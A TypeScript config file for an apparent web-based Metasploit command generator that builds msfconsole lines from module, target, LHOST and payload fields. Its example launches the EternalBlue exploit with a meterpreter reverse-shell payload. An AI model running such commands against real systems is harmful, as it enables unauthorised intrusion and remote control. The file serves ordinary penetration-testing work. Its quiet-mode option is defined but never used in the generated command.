import type { GeneratorConfig } from '../../types/generator';

export const metasploitGenerator: GeneratorConfig = {
  id: 'metasploit',
  name: 'Metasploit / MSFConsole',
  description: 'Commands to quickly launch modules in Metasploit Framework.',
  categoryId: 'exploitation',
  exampleUsage: 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.5; run"',
  explanation: 'MSFconsole is the primary interface to the Metasploit Framework. Using the -x flag allows executing a string of console commands directly from the terminal.',
  fields: [
    {
      id: 'module',
      label: 'Module Name',
      type: 'text',
      placeholder: 'exploit/windows/smb/ms17_010_eternalblue',
      required: true,
      defaultValue: '',
      description: 'The Metasploit module to use.'
    },
    {
      id: 'rhosts',
      label: 'RHOSTS (Target)',
      type: 'text',
      placeholder: '192.168.1.5',
      required: true,
      defaultValue: '',
      description: 'The target IP or range.'
    },
    {
      id: 'lhost',
      label: 'LHOST (Attacker IP)',
      type: 'text',
      placeholder: '192.168.1.10',
      defaultValue: '',
      description: 'Your listening IP address (if using a reverse payload).'
    },
    {
      id: 'payload',
      label: 'Payload',
      type: 'text',
      placeholder: 'windows/x64/meterpreter/reverse_tcp',
      defaultValue: '',
      description: 'The payload to use.'
    },
    {
      id: 'quiet',
      label: 'Quiet Mode',
      type: 'checkbox',
      defaultValue: true,
      description: 'Do not print the banner on startup (-q).'
    }
  ],
  generateCommand: (values: Record<string, string | boolean | number>) => {
    const parts = [`msfconsole -x "use ${values.module || '<module>'};`];
    if (values.payload) parts.push(`set PAYLOAD ${values.payload};`);
    if (values.rhosts) parts.push(`set RHOSTS ${values.rhosts};`);
    if (values.lhost) parts.push(`set LHOST ${values.lhost};`);
    // Note: The original fields did not include 'lport'. If 'lport' is intended,
    // it should be added to the 'fields' array as well.
    // if (values.lport) parts.push(`set LPORT ${values.lport};`);
    parts.push('run"');
    return parts.join(' ');
  },
  seo: {
    title: 'Metasploit Command Generator - MSFconsole Exploit Automation',
    description: 'Create Metasploit msfconsole commands to automate exploit execution and payload delivery. The world most used penetration testing framework.',
    keywords: ['metasploit generator', 'msfconsole syntax', 'automated exploitation', 'metasploit framework', 'pentest automation']
  },
  additionalContent: [
    {
      title: 'About Metasploit Framework',
      content: `The Metasploit Framework (MSF) is an open-source tool for developing, testing, and executing exploits. It contains thousands of modules for scanning, exploitation, and post-exploitation.`
    }
  ]
};
